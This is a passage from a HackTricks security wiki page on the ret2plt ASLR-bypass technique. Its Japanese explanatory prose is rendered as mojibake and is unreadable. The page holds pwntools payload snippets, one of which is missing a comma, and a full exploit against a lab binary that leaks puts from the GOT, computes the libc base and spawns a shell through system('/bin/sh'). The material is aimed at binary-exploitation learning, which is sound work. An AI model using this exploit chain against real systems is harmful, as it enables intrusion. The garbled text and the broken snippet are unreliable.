# Ret2plt

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricks ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricks ã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„** ã¾ãŸã¯ **HackTricks ã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„** å ´åˆã¯ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª [**NFTs**](https://opensea.io/collection/the-peass-family) ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) ã¾ãŸã¯ [**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«** [**HackTricks**](https://github.com/carlospolop/hacktricks) ã¨ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã™ã‚‹ã€‚

</details>

## åŸºæœ¬æƒ…å ±

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã®ç›®æ¨™ã¯ã€ASLRã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã«PLTã‹ã‚‰é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’**ãƒªãƒ¼ã‚¯ã™ã‚‹ã“ã¨**ã§ã™ã€‚ã“ã‚Œã¯ã€ãŸã¨ãˆã°ã€libcã‹ã‚‰`puts`é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ãƒªãƒ¼ã‚¯ã™ã‚‹ã¨ã€**`libc`ã®ãƒ™ãƒ¼ã‚¹ã‚’è¨ˆç®—**ã—ã€**`system`**ãªã©ã®ä»–ã®é–¢æ•°ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®ã‚ªãƒ•ã‚»ãƒƒãƒˆã‚’è¨ˆç®—ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

ã“ã‚Œã¯ã€`pwntools`ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦è¡Œã†ã“ã¨ãŒã§ãã¾ã™ï¼ˆ[**ã“ã¡ã‚‰ã‹ã‚‰**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got)ï¼‰ã€‚
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
æ³¨æ„ã—ã¦ãã ã•ã„ã€‚**`puts`**ï¼ˆPLTã‹ã‚‰ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä½¿ç”¨ï¼‰ãŒã€`GOT`å†…ã«ã‚ã‚‹`puts`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã§å‘¼ã³å‡ºã•ã‚Œã¦ã„ã‚‹ã“ã¨ã«æ³¨ç›®ã—ã¦ãã ã•ã„ã€‚ã“ã‚Œã¯ã€`puts`ãŒ`GOT`ã‚¨ãƒ³ãƒˆãƒªã®`puts`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å‡ºåŠ›ã™ã‚‹æ™‚ç‚¹ã§ã€**ã“ã®ã‚¨ãƒ³ãƒˆãƒªã«ã¯ãƒ¡ãƒ¢ãƒªå†…ã®`puts`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒå«ã¾ã‚Œã¦ã„ã‚‹ãŸã‚**ã§ã™ã€‚

ã¾ãŸã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã§`main`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã«æ³¨ç›®ã—ã¦ãã ã•ã„ã€‚ã—ãŸãŒã£ã¦ã€`puts`ãŒå®Ÿè¡Œã‚’çµ‚äº†ã™ã‚‹ã¨ã€**ãƒã‚¤ãƒŠãƒªã¯çµ‚äº†ã›ãšã«å†ã³`main`ã‚’å‘¼ã³å‡ºã—ã¾ã™**ï¼ˆã—ãŸãŒã£ã¦ã€æ¼æ´©ã—ãŸã‚¢ãƒ‰ãƒ¬ã‚¹ã¯å¼•ãç¶šãæœ‰åŠ¹ã§ã™ï¼‰ã€‚

{% hint style="danger" %}
ã“ã‚ŒãŒæ©Ÿèƒ½ã™ã‚‹ãŸã‚ã«ã¯ã€ãƒã‚¤ãƒŠãƒªãŒ**PIEã§ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚Œã¦ã„ãªã„**å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã¾ãŸã¯ã€`PLT`ã€`GOT`ã€ãŠã‚ˆã³`main`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’çŸ¥ã‚‹ãŸã‚ã«PIEã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹æ¼æ´©ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}

[**ã“ã¡ã‚‰ã§ã“ã®ãƒã‚¤ãƒ‘ã‚¹ã®å®Œå…¨ãªä¾‹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass)ã€‚ã“ã‚Œã¯ãã®ä¾‹ã‹ã‚‰ã®æœ€çµ‚çš„ãªã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã§ã—ãŸï¼š
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## ãã®ä»–ã®ä¾‹ã¨å‚è€ƒæ–‡çŒ®

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64ãƒ“ãƒƒãƒˆã€ASLRæœ‰åŠ¹ã€ãŸã ã—PIEãªã—ã€æœ€åˆã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ã€ã‚­ãƒ£ãƒŠãƒªãƒ¼ã®ãƒã‚¤ãƒˆ0x00ã¾ã§ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã‚’åŸ‹ã‚ã¦ã‹ã‚‰putsã‚’å‘¼ã³å‡ºã—ã¦ãƒªãƒ¼ã‚¯ã•ã›ã‚‹ã“ã¨ã§ã™ã€‚ã‚­ãƒ£ãƒŠãƒªãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã€GOTã‹ã‚‰putsã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ãƒªãƒ¼ã‚¯ã•ã›ã‚‹ãŸã‚ã®ROPã‚¬ã‚¸ã‚§ãƒƒãƒˆãŒä½œæˆã•ã‚Œã€ãã®å¾Œã€`system('/bin/sh')`ã‚’å‘¼ã³å‡ºã™ãŸã‚ã®ROPã‚¬ã‚¸ã‚§ãƒƒãƒˆãŒä½œæˆã•ã‚Œã¾ã™ã€‚
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64ãƒ“ãƒƒãƒˆã€ASLRæœ‰åŠ¹ã€ã‚­ãƒ£ãƒŠãƒªãƒ¼ãªã—ã€ãƒ¡ã‚¤ãƒ³é–¢æ•°å†…ã®ã‚¹ã‚¿ãƒƒã‚¯ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ãŒå­é–¢æ•°ã‹ã‚‰ç™ºç”Ÿã—ã¾ã™ã€‚putsã‚’å‘¼ã³å‡ºã—ã¦GOTã‹ã‚‰putsã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ãƒªãƒ¼ã‚¯ã•ã›ã€ãã®å¾Œã€ãƒ¯ãƒ³ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’å‘¼ã³å‡ºã—ã¾ã™ã€‚
